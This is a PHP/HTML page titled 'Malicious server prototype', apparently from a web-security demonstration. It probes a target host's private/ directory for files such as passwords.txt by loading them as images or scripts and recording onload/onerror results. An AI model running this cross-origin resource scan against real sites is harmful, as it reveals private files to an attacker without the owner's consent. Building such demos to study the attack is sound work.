<?php
include('../declare.php');

?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Malicious server prototype: Resource scanning</title>
<script type="text/javascript">
function gotFile(ev, ok, file) {
  var elt = document.getElementById('results');
  if (ok) {
    elt.textContent += 'Found file ' + file + '\n';
  } else {
    elt.textContent += 'Unable to find file ' + file + '\n';
  }
}
function fileError(ev) {
  var results = document.getElementById('results');
  var str = '';
  var elt = ev.srcElement;
  var file = elt.src;
  results.textContent += 'Unable to find file ' + file + '\n';
}
function fileLoad(ev) {
  var results = document.getElementById('results');
  var str = '';
  var elt = ev.srcElement;
  var file = elt.src;
  results.textContent += 'Found file ' + file + '\n';
}
</script>
</head>
<body>
<h1>Resource scanner</h1>
<div id='scans'>
</div>
<!--
<img src="<?=TGTHOST?>private/secret.png" onerror="gotFile(false, 'secret.png')" onload="gotFile(true, 'secret.png')" />
<img src="<?=TGTHOST?>private/notexist.png" onerror="gotFile(false, 'notexist.png')" onload="gotFile(true, 'notexist.png')" />
<img src="<?=TGTHOST?>private/passwords.txt" onerror="gotFile(false, 'passwords.txt')" onload="gotFile(true, 'passwords.txt')" ></iframe>
-->
<br/>
<pre id="results"></pre>
<br/>
<br/>
<a href="<?=TGTHOST?>scanning/start">scanning start</a> |
<a href="<?=TGTHOST?>home">target server home</a>
<script type="text/javascript">
var files = ['secret.png', 'notexist.png', 'passwords.txt'];
var elt = document.getElementById('scans');
for (var i in files) {
  var child;
  var file = files[i];
  if (file.indexOf('.txt') == file.length - 4) {
    child = document.createElement('script');
    child.addEventListener('error', fileError);
    child.addEventListener('load', fileLoad);
  } else {
    child = document.createElement('img');
    child.addEventListener('error', fileError);
    child.addEventListener('load', fileLoad);
  }
  child.src = "<?=TGTHOST?>private/" + file;
  elt.appendChild(child);
}
document
</script>
</body>
</html>

